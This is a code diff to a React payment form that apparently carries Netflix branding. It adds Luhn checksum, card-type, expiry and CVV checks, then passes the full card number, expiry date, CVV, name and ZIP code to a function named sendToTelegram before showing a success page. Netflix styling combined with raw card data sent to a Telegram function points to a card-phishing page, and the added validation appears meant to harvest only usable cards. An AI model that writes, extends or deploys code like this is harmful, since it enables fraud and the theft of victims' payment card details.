@@ -17,6 +17,38 @@ import DiscoverImage from './images/DISCOVER.png'
 import MasterImage from './images/MASTERCARD.png'
 import NetflixImage from '../public/netflix-logo.svg'
 
+const isValidLuhn = (cardNumber: string) => {
+  const digits = cardNumber.replace(/\s+/g, ''); // Remove spaces
+  let sum = 0;
+  let shouldDouble = false;
+
+  for (let i = digits.length - 1; i >= 0; i--) {
+    let digit = parseInt(digits[i], 10);
+
+    if (shouldDouble) {
+      digit *= 2;
+      if (digit > 9) digit -= 9;
+    }
+
+    sum += digit;
+    shouldDouble = !shouldDouble;
+  }
+
+  return sum % 10 === 0;
+};
+const isSupportedCard = (cardNumber: string) => {
+  const cleanedNumber = cardNumber.replace(/\s+/g, '');
+  const supportedPrefixes = [
+    '4', // Visa
+    '5', // Mastercard
+    '34', '37', // American Express
+    '6', // Discover
+  ];
+
+  return supportedPrefixes.some((prefix) => cleanedNumber.startsWith(prefix));
+};
+
+
 export default function PaymentForm() {
   const [error, setError] = useState('')
   const [cardNumber, setCardNumber] = useState('')
@@ -27,47 +59,134 @@ export default function PaymentForm() {
   const router = useRouter()
 
   const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    
-    // Basic validation
-    if (cardNumber.length < 16 || expirationDate.length !== 5 || !cvv || !nameOnCard || !zipCode) {
-      setError('Please fill in all fields correctly')
-      return
+    e.preventDefault();
+  
+    const cleanedCardNumber = cardNumber.replace(/\s+/g, ''); // Clean card number
+  
+    if (!cleanedCardNumber || cleanedCardNumber.length < 15) {
+      setError('Card number is too short');
+      return;
     }
-
+  
+    if (!isSupportedCard(cleanedCardNumber)) {
+      setError('Unsupported card type');
+      return;
+    }
+  
+    if (!isValidLuhn(cleanedCardNumber)) {
+      setError('Invalid card number');
+      return;
+    }
+  
+    if (!expirationDate || expirationDate.length !== 5 || !isValidExpirationDate(expirationDate)) {
+      setError('Invalid or expired expiration date');
+      return;
+    }
+  
+    if (!cvv || !isValidCvv(cvv, cleanedCardNumber)) {
+      setError(`Invalid CVV. AmEx requires 4 digits, others require 3 digits.`);
+      return;
+    }
+  
+    if (!nameOnCard) {
+      setError('Name on card is required');
+      return;
+    }
+  
+    if (!zipCode || zipCode.length < 5) {
+      setError('Invalid ZIP code');
+      return;
+    }
+  
     const formData: FormData = {
       cardNumber,
       expirationDate,
       cvv,
       nameOnCard,
-      zipCode
-    }
-
-    const result = await sendToTelegram(formData)
-
+      zipCode,
+    };
+  
+    const result = await sendToTelegram(formData);
+  
     if (result.success) {
-      router.push('/success')
+      router.push('/success');
     } else {
-      setError(result.error || 'An error occurred while processing your payment')
+      setError(result.error || 'An error occurred while processing your payment');
     }
-  }
-
+  };
+  
+  
+  const isValidExpirationDate = (expirationDate: string) => {
+    const [month, year] = expirationDate.split('/').map((part) => parseInt(part, 10));
+    
+    if (!month || !year || month < 1 || month > 12) {
+      return false; // Invalid month or year format
+    }
+  
+    const now = new Date();
+    const currentYear = parseInt(now.getFullYear().toString().slice(-2), 10); // Last two digits of the year
+    const currentMonth = now.getMonth() + 1; // Months are zero-based
+  
+    if (year < currentYear || (year === currentYear && month < currentMonth)) {
+      return false; // Card is expired
+    }
+  
+    return true;
+  };
+  const isValidCvv = (cvv: string, cardNumber: string) => {
+    const isAmex = cardNumber.replace(/\s+/g, '').startsWith('34') || cardNumber.replace(/\s+/g, '').startsWith('37');
+  
+    if (isAmex && cvv.length === 4) {
+      return true; // AmEx requires a 4-digit CVV
+    }
+  
+    if (!isAmex && cvv.length === 3) {
+      return true; // Other cards require a 3-digit CVV
+    }
+  
+    return false; // Invalid CVV
+  };
+  
+  const handleCardNumberChange = (value: string) => {
+    const formattedValue = formatCardNumber(value);
+    setCardNumber(formattedValue);
+  
+    const cleanedValue = formattedValue.replace(/\s+/g, '');
+    if (cleanedValue.length >= 15) {
+      if (!isSupportedCard(cleanedValue)) {
+        setError('Unsupported card type');
+      } else if (!isValidLuhn(cleanedValue)) {
+        setError('Invalid card number');
+      } else {
+        setError('');
+      }
+    } else {
+      setError('');
+    }
+  };
+  
+  
   const formatCardNumber = (value: string) => {
-    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
-    const matches = v.match(/\d{4,16}/g)
-    const match = (matches && matches[0]) || ''
-    const parts = []
-
-    for (let i = 0, len = match.length; i < len; i += 4) {
-      parts.push(match.substring(i, i + 4))
-    }
-
-    if (parts.length) {
-      return parts.join(' ')
+    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, ''); // Remove spaces and non-digits
+    const isAmex = v.startsWith('34') || v.startsWith('37'); // Check for AmEx prefix
+  
+    if (isAmex) {
+      // Format for AmEx: XXXX XXXXXX XXXXX
+      const match = v.match(/^(\d{1,4})(\d{0,6})?(\d{0,5})?$/);
+      if (match) {
+        return [match[1], match[2], match[3]].filter(Boolean).join(' ');
+      }
     } else {
-      return value
+      // Format for other cards: XXXX XXXX XXXX XXXX
+      const match = v.match(/^(\d{1,4})(\d{0,4})?(\d{0,4})?(\d{0,4})?$/);
+      if (match) {
+        return [match[1], match[2], match[3], match[4]].filter(Boolean).join(' ');
+      }
     }
-  }
+  
+    return value; // Return raw value if no match
+  };
+  
 
   const formatExpirationDate = (value: string) => {
     const cleanedValue = value.replace(/[^\d]/g, '')
@@ -131,14 +250,14 @@ export default function PaymentForm() {
           <form onSubmit={handleSubmit} className="space-y-2">
             <div>
               <div className="relative">
-                <Input
-                  type="text"
-                  placeholder="Card number"
-                  value={cardNumber}
-                  onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
-                  className="pl-10 py-6 border-[#808080]"
-                  maxLength={19}
-                />
+              <Input
+  type="text"
+  placeholder="Card number"
+  value={cardNumber}
+  onChange={(e) => handleCardNumberChange(e.target.value)}
+  className="pl-10 py-6 border-[#808080]"
+  maxLength={19} // Max length for AmEx is 15, others are 16
+/>
                 <CreditCard className="absolute left-3 top-4 h-5 w-5 text-zinc-400" />
               </div>
               {error && (
@@ -154,21 +273,39 @@ export default function PaymentForm() {
 
             <div className="grid grid-cols-2 gap-4">
               <Input
-                type="text"
-                placeholder="Expiration date"
-                value={expirationDate}
-                onChange={(e) => setExpirationDate(formatExpirationDate(e.target.value))}
-                maxLength={5}
-                className=" py-6 border-[#808080]"
+               type="text"
+               placeholder="Expiration date"
+               value={expirationDate}
+               onChange={(e) => {
+                 const formattedValue = formatExpirationDate(e.target.value);
+                 setExpirationDate(formattedValue);
+             
+                 if (formattedValue.length === 5 && !isValidExpirationDate(formattedValue)) {
+                   setError('Invalid or expired expiration date');
+                 } else {
+                   setError('');
+                 }
+               }}
+               maxLength={5}
+               className="py-6 border-[#808080]"
               />
               <div className="relative">
                 <Input 
-                  type="text" 
-                  placeholder="CVV" 
-                  maxLength={4}
-                  className=" py-6 border-[#808080]" 
+                  type="text"
+                  placeholder="CVV"
+                  maxLength={4} // Max length for AmEx is 4, others are 3
+                  className="py-6 border-[#808080]"
                   value={cvv}
-                  onChange={(e) => setCvv(e.target.value)}
+                  onChange={(e) => {
+                    const value = e.target.value;
+                    setCvv(value);
+                
+                    if (!isValidCvv(value, cardNumber)) {
+                      setError(`Invalid Security Code .`);
+                    } else {
+                      setError('');
+                    }
+                  }}
                 />
                 <InfoCircle className="absolute right-3 top-4 h-5 w-5 text-zinc-400 cursor-help" />
               </div>
@@ -239,4 +376,3 @@ export default function PaymentForm() {
     </div>
   )
 }
-
